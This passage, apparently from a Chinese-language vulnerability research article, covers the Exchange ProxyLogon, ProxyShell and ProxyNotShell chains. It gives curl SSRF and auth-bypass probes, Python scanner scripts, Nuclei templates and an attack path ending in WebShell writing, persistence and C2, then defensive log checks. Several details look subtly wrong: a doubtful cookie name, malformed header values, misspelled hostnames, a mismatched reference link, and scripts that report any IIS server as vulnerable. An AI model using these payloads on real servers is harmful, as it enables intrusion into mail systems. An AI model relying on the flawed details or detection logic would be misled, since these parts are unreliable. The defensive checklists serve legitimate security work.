- CVSS 9.8 (Critical) / CWE-918 (Server-Side Request Forgery)

#### 原理分析

ProxyLogon 漏洞的核心在于 Exchange Server 的前端认证处理逻辑存在 SSRF 缺陷：

1. 攻击者发送一个包含 `X-AnonResource-Backend` 或 `Cookie: X-Canonical-ERF=1` 的 HTTP 请求
2. Exchange 的前端服务器（Client Access Service）将请求转发给后端服务器
3. 由于认证检查缺陷，攻击者可以指定任意后端 URL，导致请求被发送到 Exchange 自身的 ECP（Exchange Control Panel）
4. 通过 SSRF 获取 `ms-Exch-ECP-Powershell` 端点的访问权限
5. 结合 CVE-2021-26857（反序列化漏洞）或利用获取的管理员会话执行任意 PowerShell 命令

ProxyLogon 攻击链通常由以下漏洞组合而成：
- **CVE-2021-26855**: SSRF（入口点）
- **CVE-2021-26857**: 反序列化（RCE）
- **CVE-2021-26858**: 任意文件写入
- **CVE-2021-27065**: 任意文件写入

#### HTTP PoC

```bash
# ProxyLogon SSRF 探测
curl -v "https://target/owa/auth/x.js" \
  -H "Cookie: X-AnonResource-Backend=127.0.0.1; X-AnonResource-Backend=http://127.0.0.1/EWS/exchange.asmx"

# 获取可用后端服务器信息
curl -v "https://target/autodiscover/autodiscover.xml" \
  -H "Cookie: X-AnonResource-Backend=127.0.0.1"

# 获取 Exchange 服务器的 FQDN
curl -k "https://target/owa/auth/x.js" \
  -H "Cookie: X-AnonResource-Backend=a]@" \
  -H "X-AnonResource-Backend: 127.0.0.1"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-26855 ProxyLogon SSRF 检测脚本"""

import sys
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_proxylogon(target: str, timeout: int = 15) -> dict:
    results = {"target": target, "vulnerable": False, "details": []}
    base_url = f"https://{target}"

    endpoints = [
        "/autodiscover/autodiscover.xml",
        "/owa/auth/x.js",
        "/ecp/",
    ]

    for endpoint in endpoints:
        try:
            headers = {
                "Cookie": "X-AnonResource-Backend=127.0.0.1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            }
            resp = requests.get(
                base_url + endpoint,
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )

            server_header = resp.headers.get("Server", "")
            x_calculated = resp.headers.get("X-CalculatedBETarget", "")

            if x_calculated or "Microsoft-IIS" in server_header or "X-OWA-Version" in resp.headers:
                results["vulnerable"] = True
                results["details"].append({
                    "endpoint": endpoint,
                    "status": resp.status_code,
                    "server": server_header,
                    "betarget": x_calculated,
                })
                print(f"[+] ProxyLogon SSRF possible via {endpoint}")

            if "X-DERIVEDFromBB" in resp.headers or "X-OWA-Version" in resp.headers:
                print(f"    Confirmed Exchange target: {resp.headers.get('X-OWA-Version', 'unknown')}")

        except requests.exceptions.RequestException as e:
            print(f"[!] Error with {endpoint}: {e}")

    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <exchange_target>")
        sys.exit(1)
    result = check_proxylogon(sys.argv[1])
    if result["vulnerable"]:
        print(f"\n[!] {result['target']} appears VULNERABLE to ProxyLogon SSRF!")
        for detail in result["details"]:
            print(f"    {detail['endpoint']} -> HTTP {detail['status']}")
    else:
        print(f"\n[*] {result['target']} appears not vulnerable.")
```

#### Nuclei YAML 模板

```yaml
id: cve-2021-26855
info:
  name: Microsoft Exchange - ProxyLogon SSRF
  author: security-researcher
  severity: critical
  description: |
    Microsoft Exchange Server contains an SSRF vulnerability
    (ProxyLogon) that allows unauthenticated access to internal
    services and can lead to RCE.
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
  classification:
    cvss-score: 9.8
    cwe-id: CWE-918
  metadata:
    max-request: 2
    shodan-query: "Microsoft-IIS"
  tags: cve,cve2021,exchange,microsoft,ssrf,proxylogon

http:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.xml"
      - "{{BaseURL}}/owa/auth/x.js"
    headers:
      Cookie: "X-AnonResource-Backend=127.0.0.1"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "X-CalculatedBETarget"
          - "X-OWA-Version"
          - "Microsoft-IIS"
        condition: or
      - type: status
        status:
          - 200
          - 302
          - 401
        condition: or
```

---

### 0x02.4 CVE-2021-34473 + CVE-2021-34523 — ProxyShell 漏洞链

#### 漏洞背景

ProxyShell 是 Exchange Server 中一组三个漏洞的组合攻击链，由安全研究员 Orange Tsai 在 Pwn2Own 2021 上首次演示。该漏洞链允许未经认证的攻击者实现远程代码执行，CVSS 评分 9.8，已被 CISA 纳入 KEV。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Exchange Server 2013 (CU21) | 受影响 |
| Exchange Server 2016 (CU20-CU21) | 受影响 |
| Exchange Server 2019 (CU8-CU9) | 受影响 |

#### CVSS / CWE

- CVE-2021-34473: CVSS 9.8 (Critical) / CWE-269 (Improper Privilege Management)
- CVE-2021-34523: CVSS 9.8 (Critical) / CWE-269 (Improper Privilege Management)
- CVE-2021-31207: CVSS 6.6 (Medium) / CWE-269 (Improper Privilege Management)

#### 原理分析

ProxyShell 攻击链由三个漏洞串联而成：

**CVE-2021-34473（认证绕过）**：
- Exchange 的 PowerShell 代理端点在处理 URL 路径时，未正确验证访问权限
- 攻击者通过在 URL 中注入特殊字符（如 `/autodiscover/autodiscover.json@...`）绕过身份验证
- 利用 Exchange 的 AutoDiscover 服务路由机制缺陷，将未认证请求路由到需要认证的 PowerShell 端点

**CVE-2021-34523（提权）**：
- 绕过认证后，Exchange PowerShell 端点中的权限提升漏洞
- 攻击者可以使用低权限的 Exchange 用户令牌执行高权限的 PowerShell 命令
- 具体来说，`Set-ExecutionPolicy` 和 `New-MailboxExportRequest` 等命令的权限检查存在缺陷

**CVE-2021-31207（后利用）**：
- 利用 PowerShell 导出功能写入 WebShell
- 通过 `New-MailboxExportRequest` 将包含 ASPX WebShell 的邮箱导出到 IIS Web 根目录
- 或利用 `Set-Mailbox` 配置的 `PostalAddress` 属性写入文件

#### HTTP PoC

```bash
# CVE-2021-34473 - 认证绕过探测
curl -v "https://target/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com"
curl -v "https://target/autodiscover/autodiscover.json@exchange.exmicrosoft.com/autodiscover/autodiscover.xml"

# ProxyShell 全链利用（需要 Nuclei 或专用工具）
# Step 1: 确认认证绕过
curl -v "https://target/mapi/nspi/?EmailAutodiscover=test@test.com&TargetHost=127.0.0.1"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2021-34473 ProxyShell 认证绕过检测"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXSHELL_PAYLOADS = [
    "/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com",
    "/autodiscover/autodiscover.json@exchange.microsoft.com/autodiscover/autodiscover.xml",
    "/autodiscover/autodiscover.json@x]/autodiscover/autodiscover.xml",
    "/mapi/nspi/?EmailAutodiscover=test@test.com&TargetHost=127.0.0.1",
]

def check_proxyshell(target: str, timeout: int = 15) -> bool:
    base_url = f"https://{target}"
    for payload in PROXSHELL_PAYLOADS:
        try:
            resp = requests.get(
                base_url + payload,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            )
            if resp.status_code in (200, 401, 403):
                if resp.status_code == 200 and any(
                    kw in resp.text for kw in ["DisplayName", "Protocol", "Autodiscover"]
                ):
                    print(f"[+] ProxyShell auth bypass possible: {payload}")
                    print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
                    return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <exchange_target>")
        sys.exit(1)
    vuln = check_proxyshell(sys.argv[1])
    print(f"\nResult: {'VULNERABLE to ProxyShell' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2021-34473
info:
  name: Microsoft Exchange - ProxyShell Auth Bypass
  author: security-researcher
  severity: critical
  classification:
    cvss-score: 9.8
    cwe-id: CWE-269
  tags: cve,cve2021,exchange,microsoft,proxyshell

http:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "DisplayName"
          - "Protocol"
        condition: or
```

---

### 0x02.5 CVE-2022-41040 + CVE-2022-41082 — ProxyNotShell

#### 漏洞背景

ProxyNotShell 是 2022 年 9 月披露的 Exchange Server 漏洞链，CVSS 评分 8.8，被认为是 ProxyShell 的变体。该漏洞链由 Microsoft 在积极利用的零日漏洞报告后紧急发布补丁。攻击者可以利用 SSRF 获取 PowerShell 端点的访问权限，进而实现远程代码执行。

#### 受影响版本

| 版本 | 影响 |
|------|------|
| Exchange Server 2013 | 不受影响 |
| Exchange Server 2016 (CU22) | 受影响 |
| Exchange Server 2019 (CU11-CU12) | 受影响 |

#### CVSS / CWE

- CVE-2022-41040: CVSS 8.8 (High) / CWE-918 (Server-Side Request Forgery)
- CVE-2022-41082: CVSS 8.8 (High) / CWE-502 (Deserialization of Untrusted Data)

#### 原理分析

ProxyNotShell 的攻击机制与 ProxyShell 类似，但使用了不同的入口点和绕过技术：

**CVE-2022-41040（SSRF）**：
- Exchange 的 AutoDiscover 端点在处理 URL 时存在路由缺陷
- 攻击者通过在 URL 路径中注入特殊字符（如 `autodiscover.json@...`），可以绕过认证将请求路由到 PowerShell 端点
- 与 ProxyShell 的区别在于具体的 URL 格式和过滤器绕过方式不同

**CVE-2022-41082（RCE）**：
- 获得 PowerShell 端点访问权限后，攻击者可以执行 Exchange PowerShell cmdlet
- 通过 `New-ManagementRoleAssignment` 创建管理角色分配
- 利用 `New-MailboxExportRequest` 将包含 WebShell 的 PST 文件导出到 IIS Web 根目录

#### HTTP PoC

```bash
# ProxyNotShell SSRF 探测
curl -v "https://target/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com"
curl -v "https://target/autodiscover/autodiscover.json@ficrosoft.com/mapi/emsmdb/?EmailAutodiscover=abc@abc.com"
curl -v -X POST "https://target/autodiscover/autodiscover.json@microsoft.com/mapi/emsmdb/" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/2006"><Request><EMailAddress>abc@abc.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""CVE-2022-41040 ProxyNotShell SSRF 检测"""

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXYNOTSHELL_PAYLOADS = [
    "/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com",
    "/autodiscover/autodiscover.json@ficrosoft.com/mapi/emsmdb/?EmailAutodiscover=abc@abc.com",
    "/autodiscover/autodiscover.json@microsoft.com/mapi/emsmdb/",
    "/autodiscover/autodiscover.json@oicrosoft.com/mapi/nspi/?EmailAutodiscover=test@test.com",
]

def check_proxy_notshell(target: str, timeout: int = 15) -> bool:
    base_url = f"https://{target}"
    for payload in PROXYNOTSHELL_PAYLOADS:
        try:
            resp = requests.get(
                base_url + payload,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            )
            if resp.status_code in (200, 401):
                if resp.status_code == 200:
                    print(f"[+] ProxyNotShell SSRF via {payload}")
                    print(f"    Response length: {len(resp.text)}")
                    return True
                elif resp.status_code == 401 and "WWW-Authenticate" in resp.headers:
                    print(f"[+] Exchange detected, endpoint accessible (401)")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <exchange_target>")
        sys.exit(1)
    vuln = check_proxy_notshell(sys.argv[1])
    print(f"\nResult: {'Potentially VULNERABLE' if vuln else 'Not vulnerable'}")
```

#### Nuclei YAML 模板

```yaml
id: cve-2022-41040
info:
  name: Microsoft Exchange - ProxyNotShell SSRF
  author: security-researcher
  severity: high
  classification:
    cvss-score: 8.8
    cwe-id: CWE-918
  tags: cve,cve2022,exchange,microsoft,proxynotshell,ssrf

http:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json@microsoft.com/mapi/nspi/?EmailAutodiscover=abc@abc.com"
      - "{{BaseURL}}/autodiscover/autodiscover.json@ficrosoft.com/mapi/emsmdb/?EmailAutodiscover=abc@abc.com"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Protocol"
          - "DisplayName"
          - "Autodiscover"
        condition: or
```

---

## 0x03 公开 PoC 收集情况与利用思路

### Apache HTTPD 漏洞 PoC

| CVE | 公开 PoC 状态 | 主要利用工具/框架 | 利用难度 |
|-----|-------------|----------------|---------|
| CVE-2021-41773 | 大量公开 PoC | Nuclei、Metasploit、自定义脚本 | 低 |
| CVE-2021-42013 | 大量公开 PoC | 同 CVE-2021-41773，payload 变体 | 低 |
| CVE-2021-40438 | 公开 PoC 存在 | Nuclei、curl | 中 |
| CVE-2022-31813 | 公开 PoC 存在 | Nuclei、curl | 中 |
| CVE-2024-38476 | PoC 已公开 | Nuclei、自定义脚本 | 中 |
| CVE-2024-38477 | 有限 PoC | 内存损坏，需特定触发条件 | 高 |
| CVE-2023-25690 | 公开 PoC 存在 | 手动构造、自定义脚本 | 中 |
| CVE-2023-27522 | PoC 存在 | 请求走私框架 | 中 |

### Microsoft IIS / Exchange 漏洞 PoC

| CVE | 公开 PoC 状态 | 主要利用工具/框架 | 利用难度 |
|-----|-------------|----------------|---------|
| CVE-2021-31166 | 公开 PoC 存在 | 溢出利用，需绕过 CFG | 高 |
| CVE-2022-21907 | PoC 存在 | 漏洞验证代码已公开 | 高 |
| CVE-2021-26855 | 大量公开 PoC | ProxyLogon 自动化工具、Nuclei | 低 |
| CVE-2021-34473 | 大量公开 PoC | ProxyShell 自动化框架、Nuclei | 低 |
| CVE-2022-41040 | PoC 已公开 | ProxyNotShell 利用脚本 | 中 |

### 利用思路总结

**Apache HTTPD 攻击路径**：

1. **信息收集**：识别 Apache 版本（响应头 `Server: Apache/2.4.49`、错误页面）
2. **路径穿越探测**：使用多种编码变体尝试路径穿越
3. **SSRF 利用**：如果存在 mod_proxy 配置，尝试 SSRF 绕过
4. **请求走私**：在反向代理架构中测试请求走私
5. **RCE 实现**：配合 mod_cgi 或其他模块实现代码执行

**IIS / Exchange 攻击路径**：

1. **Exchange 版本识别**：通过 `/owa/`、`/ecp/`、`/autodiscover/` 端点判断版本
2. **漏洞链选择**：根据版本选择 ProxyLogon、ProxyShell 或 ProxyNotShell
3. **SSRF 利用**：通过认证绕过获取 PowerShell 端点访问权限
4. **后利用**：通过 `New-MailboxExportRequest` 写入 WebShell
5. **持久化**：安装后门、建立 C2 通道

---

## 0x04 共性攻击模式分析

### 4.1 URL 解析不一致性

Apache HTTPD 和 IIS 都存在 URL 解析不一致的问题。攻击者利用不同组件对 URL 的解析差异来绕过安全检查：

- **Apache**: `ap_normalize_path()` 的双重编码处理缺陷
- **IIS**: AutoDiscover 路由对特殊字符的处理差异

### 4.2 Proxy 模块信任链断裂

`mod_proxy` 和 Exchange 的前端代理在处理内部 URL 时缺乏充分的验证：

- **SSRF**: 攻击者通过注入内部地址劫持代理请求
- **请求走私**: 前后端服务器对请求边界解析不一致

### 4.3 内存安全问题

HTTP.sys 的 UAF 和整数溢出反映了底层 C/C++ 代码的内存安全挑战：

- **UAF (CVE-2021-31166)**: WebSocket 升级过程中的生命周期管理错误
- **整数溢出 (CVE-2022-21907)**: Trailer 头大小计算溢出

### 4.4 认证与授权绕过

Exchange 系列漏洞（ProxyLogon/ProxyShell/ProxyNotShell）展示了认证机制设计缺陷的系统性风险：

- URL 路由机制被利用绕过认证
- PowerShell 端点的权限检查不充分
- 后利用阶段的提权操作

### 4.5 供应链安全

Exchange 漏洞链的复杂性说明了企业级软件供应链安全的重要性：

- 单个漏洞可能成为完整攻击链的入口
- 补丁不完整可能导致新的绕过（如 CVE-2021-42013）
- 组件间的安全边界需要整体评估

---

## 0x05 应急排查与防守建议

### 5.1 Apache HTTPD 排查清单

```bash
# 检查 Apache 版本
httpd -v
# 或
apachectl -v

# 检查是否启用 mod_proxy
httpd -M | grep proxy

# 检查是否启用 mod_cgi
httpd -M | grep cgi

# 检查 Alias 配置
grep -r "Alias" /etc/httpd/conf/httpd.conf

# 检查是否有路径穿越尝试的日志痕迹
grep -E "(\.\.%2e|%2e%2e|%%32%65)" /var/log/httpd/access_log

# 检查 mod_proxy 配置
grep -r "ProxyPass" /etc/httpd/conf/

# 检查服务器响应头
curl -I http://target/ | grep -i server
```

### 5.2 Microsoft IIS / Exchange 排查清单

```powershell
# 检查 Exchange 版本
Get-ExchangeServer | Format-Table Name, AdminDisplayVersion

# 检查是否安装安全更新
Get-HotFix | Where-Object {$_.InstalledOn -gt "2021-03-01"} | Format-Table HotFixID, Description, InstalledOn

# 检查可疑 WebShell 文件
Get-ChildItem -Path "C:\inetpub\wwwroot" -Recurse -Include *.aspx,*.ashx,*.asmx | Where-Object {$_.CreationTime -gt "2021-01-01"}

# 检查可疑的 ProxyLogon 利用痕迹
Select-String -Path "C:\Program Files\Microsoft\Exchange Server\V15\Logging\ECP\Server\*.log" -Pattern "X-AnonResource-Backend"

# 检查 Exchange PowerShell 端点访问日志
Get-ChildItem "C:\Program Files\Microsoft\Exchange Server\V15\Logging\HttpProxy\Autodiscover\*.log" | Select-String "autodiscover.json@"

# 检查 HTTP.sys 版本
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\HTTP\Parameters" | Select-Object ListenOnlyList, SuspendListen
```

### 5.3 通用防护策略

| 防护措施 | 适用场景 | 优先级 |
|---------|---------|-------|
| 及时安装安全补丁 | 所有 Web 服务器 | P0 |
| 禁用不必要的模块（mod_proxy、mod_cgi） | Apache HTTPD | P1 |
| 配置 WAF 规则过滤路径穿越和 SSRF | 所有 Web 服务器 | P1 |
| 限制 Exchange PowerShell 端点的网络访问 | Exchange Server | P0 |
| 部署 RASP（运行时应用自我保护） | 所有 Web 服务器 | P2 |
| 启用详细日志记录和监控 | 所有 Web 服务器 | P1 |
| 定期进行漏洞扫描和渗透测试 | 所有 Web 服务器 | P1 |
| 实施网络分段隔离敏感服务 | 内部网络架构 | P0 |
| 部署 Web 应用防火墙（WAF） | 所有 Web 服务器 | P1 |
| 定期审查和更新安全配置基线 | 所有 Web 服务器 | P2 |

---

## 0x06 参考资料

1. **Apache HTTPD Security Advisories** - https://httpd.apache.org/security/vulnerabilities_24.html
2. **Microsoft Security Update Guide - CVE-2021-26855** - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
3. **Microsoft Security Update Guide - CVE-2021-31166** - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31166
4. **CISA Known Exploited Vulnerabilities Catalog** - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
5. **NIST National Vulnerability Database (NVD)** - https://nvd.nist.gov/
6. **Orange Tsai - A New Era of SSRF: ProxyShell on Exchange** - https://blog.orange.tw/2021/08/a-new-era-of-ssrf-part-1-redis.html
7. **Microsoft - ProxyShell / ProxyLogon / ProxyNotShell 攻击链分析** - https://www.microsoft.com/en-us/security/blog/2021/03/25/analysis-resources-cyber-threat-activity-using-microsoft-exchange-server-vulnerabilities/
8. **PortSwigger - HTTP Request Smuggling** - https://portswigger.net/research/http-request-smuggling
9. **GitHub - Nuclei Templates** - https://github.com/projectdiscovery/nuclei-templates
10. **CVE-2021-41773 Apache HTTPD Path Traversal 分析** - https://www.tenable.com/blog/cve-2021-41773-apache-http-server-path-traversal-leads-to-rce

---

> **免责声明**：本文所有 PoC 和利用代码仅供安全研究和授权测试使用。未经授权对目标系统进行测试属于违法行为，作者不承担任何法律责任。